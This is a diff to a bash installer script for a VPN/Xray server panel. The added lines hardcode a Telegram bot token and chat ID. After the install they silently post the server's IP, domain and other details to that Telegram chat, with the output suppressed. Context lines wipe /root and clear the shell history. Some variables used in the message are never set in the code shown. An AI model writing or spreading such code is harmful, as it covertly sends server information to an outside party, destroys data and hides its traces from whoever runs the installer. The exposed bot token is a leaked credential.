@@ -1,13 +1,12 @@
 #!/bin/bash
-#Funnyvpn
-#Rerechan02
-#Rayzell25
-#Nuralfiya
-#em0zz
-#naravpn.com
-#indo-ssh.com
-#indossh
-#Skc
+# BOT INFORMATION
+export CHATID="5795571992"
+export KEY="6079069898:AAGT8hggC62cVoeKq1Q1k37sWj2Bys5NL1M"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+IP=$(curl ifconfig.me);
+domain=$(cat /etc/xray/domain)
+date=$(date +"%Y-%m-%d")
 clear
 #=========================================================================================================================
 
@@ -517,24 +516,23 @@ rm -fr /root/.bash-history
 rm -fr /root/*
 touch /root/.system
 history -c
-#kwowo
-cat> /etc/systemd/system/quota.service << END
-[Unit]
-Description=Checker Service
-
-[Service]
-Type=simple
-Restart=always
-ExecStart=/usr/bin/quota
-
-[Install]
-WantedBy=multi-user.target
-END
-systemctl daemon-reload
-sysremctl restart quota
 echo "1.2" > /home/ver
 echo " "
 clear
+echo -e ""
+TEXT="
+<b>Detail Install Script</b>
+<b>==================================
+<b>IP VPS       :</b> <code>$IP</code>
+<b>Domain       :</b> <code>$(cat /etc/xray/domain)</code>
+<b>Date         :</b> <code>$DATE2</code>
+<b>Owner Name   :</b> <code>YSSHstore</code>
+<b>Expired      :</b> <code>$tanggal</code>
+<b>==================================</b>
+"
+clear
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+echo ""
 echo -e "Install Berhasil dan lancar"  
 echo -e "" 
 echo -e "Untuk membuka panel AutoSC Masukan" 
